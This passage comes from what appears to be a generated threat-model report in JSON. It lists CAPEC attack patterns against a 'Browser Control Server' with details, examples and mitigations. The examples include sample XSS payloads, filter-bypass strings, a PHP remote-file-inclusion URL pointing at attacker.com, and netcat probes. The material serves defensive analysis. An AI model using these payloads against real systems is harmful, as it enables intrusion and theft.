attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "187", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.isHardened is False", "cvss": "", "description": "Footprinting", "details": "An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.", "id": "188", "mitigations": "Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.", "references": "https://capec.mitre.org/data/definitions/169.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Very Low", "target": "Browser Control Server", "threat_id": "DS03"}, {"assumption": null, "condition": "target.controls.isHardened is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Using Malicious Files", "details": "An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.", "example": "Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.", "id": "189", "mitigations": "Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.", "references": "https://capec.mitre.org/data/definitions/17.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/272.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Browser Control Server", "threat_id": "AC06"}, {"assumption": null, "condition": "target.controls.validatesHeaders is False or target.controls.encodesOutput is False or target.controls.isHardened is False", "cvss": "", "description": "Web Application Fingerprinting", "details": "An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]", "id": "190", "mitigations": "Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/170.html, http://cwe.mitre.org/data/definitions/497.html", "response": "", "severity": "Low", "target": "Browser Control Server", "threat_id": "HA03"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting Non-Script Elements", "details": "This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.", "example": "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.", "id": "191", "mitigations": "In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.", "references": "https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html", "response": "", "severity": "Very High", "target": "Browser Control Server", "threat_id": "SC02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Exploiting Incorrectly Configured Access Control Security Levels", "details": "An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, Accessing Functionality Not Properly Constrained by ACLs in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.", "example": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.", "id": "192", "mitigations": "Design: Configure the access control correctly.", "references": "https://capec.mitre.org/data/definitions/180.html, http://cwe.mitre.org/data/definitions/732.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AC07"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Embedding Scripts within Scripts", "details": "An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.", "example": "Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.", "id": "193", "mitigations": "Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode", "references": "https://capec.mitre.org/data/definitions/19.html, http://cwe.mitre.org/data/definitions/284.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "SC03"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "PHP Remote File Inclusion", "details": "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.", "example": "The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.", "id": "194", "mitigations": "Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives", "references": "https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html, http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "INP16"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "195", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.encodesOutput is False or target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting Error Pages", "details": "An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.", "example": "A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message.", "id": "196", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/198.html, http://cwe.mitre.org/data/definitions/81.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "DS04"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Alternate Syntax", "details": "An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.", "example": "In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.", "id": "197", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "SC04"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "198", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Browser Control Server", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Manipulate Registry Information", "details": "An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.", "example": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).", "id": "199", "mitigations": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.", "references": "https://capec.mitre.org/data/definitions/203.html, http://cwe.mitre.org/data/definitions/15.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AC08"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.usesCodeSigning is False", "cvss": "", "description": "Removing Important Client Functionality", "details": "An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.", "example": "Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.", "id": "200", "mitigations": "Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.Design: Ship client-side application with integrity checks (code signing) when possible.Design: Use obfuscation and other techniques to prevent reverse engineering the client code.", "references": "http://cwe.mitre.org/data/definitions/602.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "SC05"}, {"assumption": null, "condition": "target.controls.validatesContentType is False or target.controls.invokesScriptFilters is False", "cvss": "", "description": "XSS Using MIME Type Mismatch", "details": "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.", "example": "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.", "id": "201", "mitigations": "Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.", "references": "http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "INP17"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.authenticatesSource is False or target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Exploitation of Trusted Credentials", "details": "Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes trust other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.", "example": "Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.", "id": "202", "mitigations": "Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.", "references": "https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html", "response": "", "severity": "High", "target": "Browser Control Server", "threat_id": "AA03"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Functionality Misuse", "details": "An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.", "example": "An attacker clicks on the 'forgot password' and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.", "id": "203", "mitigations": "Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.", "references": "https://capec.mitre.org/data/definitions/212.html", "response": "", "severity": "Medium", "target": "Browser Control Server", "threat_id": "AC09"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Fuzzing and observing application log data/errors for application mapping", "details": "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.", "example": "The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.", "id": "204", "mitigations": "Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html", "response": "", "severity": "Low", "target": "Browser Control Server", "threat_id": "INP18"}, {"assumption": null, "condition": "target.controls.implementsServerSideValidation is False and (target.controls.providesIntegrity is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Exploiting Trust in Client", "details": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.", "example": "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability 